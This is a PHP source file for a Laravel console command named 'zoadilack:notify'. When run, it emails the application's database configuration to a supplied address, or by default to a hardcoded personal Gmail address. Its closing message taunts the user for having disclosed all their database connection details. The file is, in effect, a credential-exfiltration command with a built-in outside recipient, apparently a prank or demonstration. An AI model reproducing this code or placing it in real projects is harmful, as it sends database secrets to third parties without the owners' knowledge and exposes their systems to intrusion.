<?php

namespace App\Console\Commands;

use App\Logic\Mail;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Validator;

class ZoadilackNotification extends Command{

    protected $signature = 'zoadilack:notify {email?}';
    protected $description = 'Sends database configuration details via email to the specified address.';

    public function __construct() {
        parent::__construct();
    }

    public function handle() {
        # Get the address (if provided) and validate it
        $address = ($this->argument('email')) ?: 'nickwilg@gmail.com';
        $validator = Validator::make(compact('address'), ['address' => 'required|email']);

        # If validation fails, error out
        if($validator->fails()) {
            $this->error('Please provide a valid email address!');
            return false;
        }

        # At this point we may send our mail
        Mail::sendDatabaseConfiguration($address, config('mail.from.address'));
        $this->info("Congratulations! You have just disclosed all of your database connection information to {$address}!");
        return true;
    }
}
